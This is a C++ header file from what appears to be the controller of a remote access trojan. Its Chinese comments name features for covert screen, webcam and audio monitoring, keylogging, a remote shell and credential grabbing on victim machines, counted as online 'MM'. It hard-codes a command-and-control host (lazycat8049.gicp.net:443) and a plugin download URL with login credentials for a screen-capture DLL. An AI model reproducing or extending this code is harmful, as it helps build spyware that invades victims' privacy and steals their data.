// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(__TSP_CLIENT_PUBLIC_H__)
#define __TSP_CLIENT_PUBLIC_H__

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#include <winsock2.h>
#include <winioctl.h>
#define MFCXLIB_STATIC 
#include "./include/CJ60Lib/CJ60Lib.h"		// CJ60 Library components

#include "SplashScreenEx.h"

#include "include\IOCPServer.h"
#include "macros.h"
#include "LicenseDef.h"

#include "..\TSPServer\until.h"

#include "vfw.h" // DrawDibOpen
#pragma comment(lib, "vfw32.lib")

#ifndef SAFE_CLOSEFILEHANDLE
#define SAFE_CLOSEFILEHANDLE(p) {if (INVALID_HANDLE_VALUE != p) {CloseHandle(p); p = INVALID_HANDLE_VALUE;}}
#endif

#ifndef SAFE_DELETE
#define SAFE_DELETE(p) {if (NULL != p) {delete p; p = NULL;}}
#endif

enum 
{
	WM_CLIENT_CONNECT = WM_APP + 0x1001,
	WM_CLIENT_CLOSE,
	WM_CLIENT_NOTIFY,
	WM_DATA_IN_MSG,
	WM_DATA_OUT_MSG,


	WM_ADDTOLIST = WM_USER + 102,	// 添加到列表视图中
	WM_REMOVEFROMLIST,				// 从列表视图中删除
	WM_OPENMANAGERDIALOG,			// 打开一个文件管理窗口
	WM_OPENSCREENSPYDIALOG,			// 打开一个屏幕监视窗口
	WM_OPENWEBCAMDIALOG,			// 打开摄像头监视窗口
	WM_OPENAUDIODIALOG,				// 打开一个语音监听窗口
	WM_OPENKEYBOARDDIALOG,			// 打开键盘记录窗口
	WM_OPENPSLISTDIALOG,			// 打开进程管理窗口
	WM_OPENSHELLDIALOG,				// 打开shell窗口
	WM_RESETPORT,					// 改变端口
	WM_OPENSERECTDIALOG,			// 打开密取配置对话框
	WM_HEARTBEAT,					//心跳
	WM_GET_ONLINE_NUMBER,			//获得在线MM数量
	WM_GET_ITEM_NUMBER,
	WM_PLUGIN_REQUEST,				// 请求插件下载
	WM_PLUGIN_REMOVE,				// 插件卸载通知UI
	//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,
	SCREENSPY_DLG,
	WEBCAM_DLG,
	AUDIO_DLG,
	KEYBOARD_DLG,
	SYSTEM_DLG,
	SHELL_DLG,
	FILEMANAGER_AUTO,
	SECRET_GET,
};

// #define LICSERVER_IPADDR	"127.0.0.1"
// //#define LICSERVER_IPADDR	"96.9.158.149"
// #define LICSERVER_LISPORT	443


// #define LICSERVER_IPADDR	"202.67.211.1"
// #define LICSERVER_LISPORT	443
//  #define LICSERVER_IPADDR	"lazycat8049.gicp.net"
//  #define LICSERVER_LISPORT	443


#ifdef PUBLISH
#define LICSERVER_IPADDR	"lazycat8049.gicp.net"
#define LICSERVER_LISPORT	443
#else
//#define LICSERVER_IPADDR	"lazycat8049.gicp.net"
#define LICSERVER_IPADDR	"127.0.0.1"
// #define LICSERVER_LISPORT	443
#define LICSERVER_LISPORT	444
#endif

#define  szFtpUrl LICSERVER_IPADDR##"/AutoScreenCap.dll -u pass -p pass :test :admin"

//#define  szFtpUrl "lazycat8049.gicp.net/AutoScreenCap.dll -u pass -p pass :test :admin"
#define szAutoCapSrccenFile "SrccenCap.ini"

#define szWebSerName "web.exe"


typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
char * GetExeCurrentDir();



void PrintString1(TCHAR *tszStr,...);


//#define debug

#ifdef debug

#define  dprintf(a) PrintString1##a

#else

#define  dprintf(a)

#endif
//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(__TSP_CLIENT_PUBLIC_H__)
